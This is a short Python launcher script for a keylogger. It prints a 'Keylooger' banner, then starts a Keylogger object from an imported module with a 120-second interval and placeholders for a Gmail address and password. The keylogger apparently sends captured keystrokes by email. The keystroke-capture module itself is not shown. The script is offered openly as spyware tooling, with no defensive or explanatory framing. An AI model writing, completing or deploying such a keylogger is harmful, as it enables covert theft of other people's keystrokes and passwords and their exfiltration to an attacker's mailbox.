import keylogger
import pyfiglet
text = pyfiglet.figlet_format("Keylooger")
print(text)
try:
  my_keylogger = keylogger.Keylogger(120, "enter your gmail", "fill your passwd") 
  my_keylogger.start()
except KeyboardInterrupt:
   print(" press ctrl+z for exit")
